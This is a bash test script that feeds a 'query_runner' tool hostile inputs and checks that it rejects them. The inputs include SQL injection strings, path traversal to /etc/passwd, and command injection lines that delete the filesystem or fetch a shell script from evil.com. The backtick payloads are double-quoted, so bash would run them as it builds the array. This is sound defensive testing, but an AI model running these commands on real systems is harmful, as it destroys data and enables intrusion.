#!/bin/bash

# Focused test for specific naughty string categories
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEST_DB="$SCRIPT_DIR/focused_test.db"
QUERY_RUNNER="$SCRIPT_DIR/query_runner"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counters
TESTS_TOTAL=0
TESTS_PASSED=0
TESTS_FAILED=0

log_test() {
    local test_name="$1"
    local result="$2"
    local expected="$3"
    local actual="$4"
    
    TESTS_TOTAL=$((TESTS_TOTAL + 1))
    
    if [[ "$result" == "PASS" ]]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        echo -e "${GREEN}✓${NC} $test_name"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        echo -e "${RED}✗${NC} $test_name"
        echo "  Expected: $expected"
        echo "  Actual: $actual"
    fi
}

# Clean up test database
cleanup() {
    if [[ -f "$TEST_DB" ]]; then
        rm -f "$TEST_DB"
    fi
}

trap cleanup EXIT

# Create test database
create_test_db() {
    sqlite3 "$TEST_DB" << 'EOF'
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, email TEXT);
INSERT INTO users (username, email) VALUES ('alice', 'alice@test.com'), ('bob', 'bob@test.com');
EOF
}

# Test SQL injection attempts
test_sql_injection() {
    echo "=== Testing SQL Injection Protection ==="
    
    local injection_payloads=(
        "'; DROP TABLE users; --"
        "\" OR 1=1 --"
        "' OR '1'='1"
        "admin'--"
        "' UNION SELECT * FROM users --"
        "; rm -rf /"
        "| cat /etc/passwd"
        "' OR 1=1#"
        "') OR 1=1--"
        "' OR username IS NOT NULL OR 'x'='x"
    )
    
    for payload in "${injection_payloads[@]}"; do
        # Test as WHERE clause value
        query="SELECT * FROM users WHERE username = '$payload'"
        
        if ! ./query_runner -t sqlite -d "$TEST_DB" -f text "$query" >/dev/null 2>&1; then
            log_test "SQL injection blocked: ${payload:0:30}..." "PASS" "rejection" "rejected"
        else
            log_test "SQL injection NOT blocked: ${payload:0:30}..." "FAIL" "rejection" "accepted"
        fi
        
        # Test as complete malicious query
        malicious_query="$payload"
        
        if ! ./query_runner -t sqlite -d "$TEST_DB" -f text "$malicious_query" >/dev/null 2>&1; then
            log_test "Malicious query blocked: ${payload:0:30}..." "PASS" "rejection" "rejected"
        else
            log_test "Malicious query NOT blocked: ${payload:0:30}..." "FAIL" "rejection" "accepted"
        fi
    done
}

# Test path traversal attempts
test_path_traversal() {
    echo "=== Testing Path Traversal Protection ==="
    
    local path_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "%2e%2e%2f"
        "../../../etc/passwd%00"
        "../../../etc/passwd\x00"
        "....\/....\/....\/etc\/passwd"
    )
    
    for payload in "${path_payloads[@]}"; do
        # Test as database path
        if ! ./query_runner -t sqlite -d "$payload" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Path traversal blocked: $payload" "PASS" "rejection" "rejected"
        else
            log_test "Path traversal NOT blocked: $payload" "FAIL" "rejection" "accepted"
        fi
        
        # Test as host parameter
        if ! ./query_runner -t sqlite -h "$payload" -d "$TEST_DB" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Host path traversal blocked: $payload" "PASS" "rejection" "rejected"
        else
            log_test "Host path traversal NOT blocked: $payload" "FAIL" "rejection" "accepted"
        fi
    done
}

# Test special characters and encoding
test_special_chars() {
    echo "=== Testing Special Characters and Encoding ==="
    
    local special_payloads=(
        $'"\n\r\t\b\f<>"'
        $'\x00\x01\x02\x03\x04\x05'
        $'\x1f\x20\x7f\x80\x81\x82'
        $'\u0000\u0001\u0002'
        $'\u001f\u0020\u007f\u0080'
        "%C0%AF"
        "%2e%2e%2f"
        "%u002e%u002e%u002f"
        "%uff0e%uff0e%uff0f"
        $'test\0string'
        $'test\x00string'
        "\\0"
        "\\x00"
        "%00"
    )
    
    for payload in "${special_payloads[@]}"; do
        # Test as query with special characters (should be accepted if properly sanitized)
        query="SELECT * FROM users WHERE username = '$payload'"
        
        if ./query_runner -t sqlite -d "$TEST_DB" -f text "$query" >/dev/null 2>&1; then
            log_test "Special chars accepted (sanitized): ${payload:0:20}..." "PASS" "acceptance" "accepted"
        else
            log_test "Special chars rejected: ${payload:0:20}..." "FAIL" "acceptance" "rejected"
        fi
        
        # Test as CLI parameter
        if ! ./query_runner -t sqlite -u "$payload" -d "$TEST_DB" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Special chars in user param blocked: ${payload:0:20}..." "PASS" "rejection" "rejected"
        else
            log_test "Special chars in user param accepted: ${payload:0:20}..." "FAIL" "rejection" "accepted"
        fi
    done
}

# Test command injection attempts
test_command_injection() {
    echo "=== Testing Command Injection Protection ==="
    
    local command_payloads=(
        "; rm -rf /"
        "| rm -rf /"
        "`rm -rf /`"
        "&& rm -rf /"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        "`cat /etc/passwd`"
        "; wget http://evil.com/shell.sh"
        "| curl http://evil.com/shell.sh"
        "; ping -c 1 127.0.0.1"
        "| whoami"
        "`whoami`"
    )
    
    for payload in "${command_payloads[@]}"; do
        # Test as host parameter
        if ! ./query_runner -t sqlite -h "$payload" -d "$TEST_DB" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Command injection in host blocked: ${payload:0:30}..." "PASS" "rejection" "rejected"
        else
            log_test "Command injection in host NOT blocked: ${payload:0:30}..." "FAIL" "rejection" "accepted"
        fi
        
        # Test as database parameter
        if ! ./query_runner -t sqlite -d "$payload" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Command injection in database blocked: ${payload:0:30}..." "PASS" "rejection" "rejected"
        else
            log_test "Command injection in database NOT blocked: ${payload:0:30}..." "FAIL" "rejection" "accepted"
        fi
    done
}

# Test long strings (DoS attempts)
test_long_strings() {
    echo "=== Testing Long String Protection ==="
    
    local long_strings=(
        $(printf 'a%.0s' {1..1000})  # 1000 chars
        $(printf 'a%.0s' {1..10000}) # 10000 chars
        $(printf 'a%.0s' {1..100000}) # 100000 chars
        "this_is_a_very_long_string_that_might_cause_buffer_overflow_or_dos_attacks_if_not_properly_handled_by_the_application_repeat_repeat_repeat_repeat_repeat_repeat_repeat_repeat"
    )
    
    for payload in "${long_strings[@]}"; do
        # Test as query parameter
        query="SELECT * FROM users WHERE username = '$payload'"
        
        if ./query_runner -t sqlite -d "$TEST_DB" -f text "$query" >/dev/null 2>&1; then
            log_test "Long string accepted: ${#payload} chars" "PASS" "acceptance" "accepted"
        else
            log_test "Long string rejected: ${#payload} chars" "FAIL" "acceptance" "rejected"
        fi
        
        # Test as CLI parameter
        if ! ./query_runner -t sqlite -u "$payload" -d "$TEST_DB" -f text "SELECT 1" >/dev/null 2>&1; then
            log_test "Long string in user param blocked: ${#payload} chars" "PASS" "rejection" "rejected"
        else
            log_test "Long string in user param accepted: ${#payload} chars" "FAIL" "rejection" "accepted"
        fi
    done
}

# Test environment file with naughty strings
test_env_file_naughty() {
    echo "=== Testing Environment File with Naughty Strings ==="
    
    # Create environment file with various naughty strings
    cat > /tmp/test_naughty.env << 'EOF'
DB_HOST=../../../etc/passwd
DB_USER=admin'; DROP TABLE users; --
DB_PASSWORD=test\x00string
DB_DATABASE=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
EOF
    
    if ! ./query_runner --env-file /tmp/test_naughty.env -f text "SELECT 1" >/dev/null 2>&1; then
        log_test "Environment file with naughty strings blocked" "PASS" "rejection" "rejected"
    else
        log_test "Environment file with naughty strings NOT blocked" "FAIL" "rejection" "accepted"
    fi
    
    rm -f /tmp/test_naughty.env
}

# Main test execution
main() {
    echo "=== Query Runner Focused Naughty Strings Tests ==="
    echo
    
    # Create test database
    create_test_db
    
    # Run focused tests
    test_sql_injection
    test_path_traversal
    test_special_chars
    test_command_injection
    test_long_strings
    test_env_file_naughty
    
    # Print test summary
    echo "=== Test Summary ==="
    echo "Total tests: $TESTS_TOTAL"
    echo "Passed: $TESTS_PASSED"
    echo "Failed: $TESTS_FAILED"
    
    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo -e "${GREEN}All focused naughty string tests passed!${NC}"
        return 0
    else
        echo -e "${RED}$TESTS_FAILED focused naughty string tests failed!${NC}"
        return 1
    fi
}

main "$@"